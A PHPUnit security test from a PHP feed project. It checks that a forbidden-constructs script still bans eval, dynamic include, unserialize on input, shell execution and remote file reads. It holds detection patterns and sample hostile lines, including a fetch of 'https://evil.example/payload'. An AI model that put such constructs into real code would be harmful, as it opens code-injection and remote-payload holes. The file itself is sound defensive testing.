<?php

declare(strict_types=1);

namespace Zfeeder\Tests\Security;

/**
 * S14 — the constructs a type checker cannot forbid are forbidden by
 * `tools/check-forbidden.sh`, and that script is run by the test suite rather
 * than only by CI, so the rule holds for anyone who runs `composer test`.
 *
 * Closes 1.6 defect L16: `newsfeeds/admin.php:112-115` did a dynamic
 * `include()` of a path chosen by `$_GET`. It was not exploitable as written —
 * the value was compared against a fixed list first — but the shape is the
 * hazard, and the shape is what this rule bans.
 *
 * The control is the script itself, plus phpstan level 8 with strict rules and
 * deptrac, all three run by the **Lint and static analysis** job in
 * `.github/workflows/ci.yml`.
 */
final class S14ForbiddenConstructsTest extends SecurityTestCase
{
    /**
     * The matches documented in `docs/THREAT-MODEL.md` as false positives of
     * the script's own patterns rather than defects in the code: `$pdo->exec()`
     * caught by the "shell execution" pattern, and `@file_get_contents()`
     * omitted from the error-suppression allow-list although every one of those
     * six reads checks its return value immediately afterwards.
     *
     * A match that is not one of these is a real finding and fails the test.
     *
     * @var list<string>
     */
    private const array KNOWN_PATTERN_FAULTS = [
        '/^src\/Storage\/Sqlite\/Database\.php:\d+:.*\$pdo->exec\(/',
        '/^src\/Storage\/AtomicFile\.php:\d+:.*@file_get_contents\(/',
        '/^src\/Admin\/Auth\/RateLimiter\.php:\d+:.*@file_get_contents\(/',
        '/^src\/Cli\/Command\/LegacyImportCommand\.php:\d+:.*@file_get_contents\(/',
        '/^src\/Render\/TemplateEngine\.php:\d+:.*@file_get_contents\(/',
    ];

    /** The rules the script must still contain; deleting one is a regression. */
    private const array REQUIRED_RULES = [
        'eval()',
        'create_function()',
        'shell execution',
        'unserialize() on input',
        'extract()',
        'dynamic include of a variable',
        'remote file read',
        'md5/sha1 for passwords',
        'assert() with a string',
        'error suppression outside the allowed filesystem calls',
    ];

    private static function scriptPath(): string
    {
        return self::projectRoot() . '/tools/check-forbidden.sh';
    }

    /** @return array{status: int, lines: list<string>} */
    private static function runScript(): array
    {
        $output = [];
        $status = 0;
        exec('bash ' . escapeshellarg(self::scriptPath()) . ' 2>&1', $output, $status);

        return ['status' => $status, 'lines' => $output];
    }

    public function testTheForbiddenConstructCheckerRunsAndReportsNothingNew(): void
    {
        self::assertFileExists(self::scriptPath());

        $result = self::runScript();

        if ($result['status'] === 0) {
            self::assertContains('check-forbidden: clean', $result['lines']);

            return;
        }

        // Non-zero: every reported line has to be one of the documented
        // pattern faults. Anything else is a forbidden construct that really
        // has been added to the tree, and this is where it fails.
        $unexpected = [];
        foreach ($result['lines'] as $line) {
            $hit = trim($line);
            if ($hit === '' || str_starts_with($hit, 'FORBIDDEN:') || $hit === 'check-forbidden: clean') {
                continue;
            }
            if (!self::isKnownPatternFault($hit)) {
                $unexpected[] = $hit;
            }
        }

        self::assertSame(
            [],
            $unexpected,
            "tools/check-forbidden.sh found a construct this codebase forbids:\n" . implode("\n", $unexpected),
        );

        self::markTestIncomplete(sprintf(
            'S14 open: tools/check-forbidden.sh exits %d with %d known false positives of its own patterns '
            . '(documented in docs/THREAT-MODEL.md). No forbidden construct is present. '
            . 'Fix the script, not the code: exclude "->exec(" from the shell-execution pattern '
            . '(it matches PDO::exec) and add file_get_contents to the error-suppression allow-list. '
            . 'Until then the CI job "Lint and static analysis" fails on this step.',
            $result['status'],
            count($result['lines']) - substr_count(implode("\n", $result['lines']), 'FORBIDDEN:'),
        ));
    }

    public function testTheCheckerStillCarriesEveryRuleItIsSupposedTo(): void
    {
        // A green script that checks nothing would satisfy the test above.
        $script = self::readFile(self::scriptPath());

        foreach (self::REQUIRED_RULES as $rule) {
            self::assertStringContainsString(
                'check "' . $rule . '"',
                $script,
                'the rule "' . $rule . '" was removed from tools/check-forbidden.sh',
            );
        }

        self::assertStringContainsString('src bin public', $script, 'the checker no longer covers src, bin and public');
        self::assertStringContainsString('exit $fail', $script, 'the checker no longer reports failure through its exit status');
    }

    public function testEveryRuleStillMatchesTheConstructItBans(): void
    {
        // The script cannot be pointed at another directory, so its own
        // patterns are lifted out of it and applied here to lines that really
        // do contain the constructs. A rule that was emptied, or loosened until
        // it no longer matches, fails here.
        $patterns = self::patternsFromScript();

        $samples = [
            'eval()' => 'eval($_GET["x"]);',
            'create_function()' => '$f = create_function("$a", "return $a;");',
            'shell execution' => '$out = shell_exec("ls");',
            'unserialize() on input' => '$data = unserialize($_POST["blob"]);',
            'extract()' => 'extract($_GET);',
            'dynamic include of a variable' => 'include($_GET["page"]);',
            'remote file read' => '$body = file_get_contents("https://evil.example/payload");',
            'md5/sha1 for passwords' => '$hash = md5($password);',
            'assert() with a string' => 'assert("1 === 1");',
            'error suppression outside the allowed filesystem calls' => '$rows = @query("select 1");',
        ];

        foreach ($samples as $label => $line) {
            self::assertArrayHasKey($label, $patterns, 'the rule "' . $label . '" is gone from the script');
            self::assertSame(
                1,
                preg_match('~' . $patterns[$label] . '~', $line),
                'the rule "' . $label . '" no longer matches: ' . $line,
            );
        }
    }

    public function testNoRuleFiresOnOrdinaryCode(): void
    {
        // The other half: patterns that matched everything would make the rules
        // useless and the suite red for the wrong reason.
        $patterns = self::patternsFromScript();
        $innocent = [
            '$pdo = new PDO($dsn);',
            '$value = $this->config->string("admin_user");',
            'return hash_equals($expected, $submitted);',
            '$contents = file_get_contents($path);',
            'use Zfeeder\\Http\\Responder;',
        ];

        foreach ($patterns as $label => $pattern) {
            foreach ($innocent as $line) {
                self::assertSame(
                    0,
                    preg_match('~' . $pattern . '~', $line),
                    'the rule "' . $label . '" fires on ordinary code: ' . $line,
                );
            }
        }
    }

    /**
     * The `check "label" 'pattern'` pairs, read out of the script.
     *
     * @return array<string, string>
     */
    private static function patternsFromScript(): array
    {
        // `'"'"'` is how a single quote is written inside a single-quoted shell
        // string; it has to be folded back before the pattern is usable.
        $script = str_replace('\'"\'"\'', "\x01", self::readFile(self::scriptPath()));

        $matches = [];
        preg_match_all('/check\s+"([^"]+)"\s*(?:\\\\\s*\n\s*)?\'([^\']*)\'/', $script, $matches, PREG_SET_ORDER);

        $out = [];
        foreach ($matches as $match) {
            $out[$match[1]] = str_replace("\x01", "'", $match[2]);
        }

        return $out;
    }

    public function testTheSourceTreeContainsNoneOfTheForbiddenConstructs(): void
    {
        // The same rules applied from PHP, so that the ban does not depend on
        // bash, grep -P or the script's own quoting.
        $banned = [
            'eval()' => '/(^|[^_[:alnum:]\$>])eval\s*\(/',
            'create_function()' => '/create_function\s*\(/',
            'unserialize()' => '/(^|[^_[:alnum:]\$>])unserialize\s*\(/',
            'extract()' => '/(^|[^_[:alnum:]\$>])extract\s*\(/',
            'dynamic include' => '/(include|require)(_once)?\s*\(?\s*\$/',
            'remote file read' => '/(file_get_contents|readfile|fopen)\s*\(\s*[\'"]https?:\/\//',
            'assert() with a string' => '/assert\s*\(\s*[\'"]/',
        ];

        $offenders = [];
        foreach (self::sourceFiles(self::projectRoot() . '/src') as $file) {
            foreach (explode("\n", self::readFile($file)) as $number => $line) {
                $code = trim($line);
                if ($code === '' || str_starts_with($code, '*') || str_starts_with($code, '//') || str_starts_with($code, '/*')) {
                    continue;
                }
                foreach ($banned as $label => $pattern) {
                    if (preg_match($pattern, $line) === 1) {
                        $offenders[] = $label . ' at ' . $file . ':' . ($number + 1) . ' — ' . $code;
                    }
                }
            }
        }

        self::assertSame([], $offenders, implode("\n", $offenders));
    }

    private static function isKnownPatternFault(string $hit): bool
    {
        foreach (self::KNOWN_PATTERN_FAULTS as $pattern) {
            if (preg_match($pattern, $hit) === 1) {
                return true;
            }
        }

        return false;
    }
}
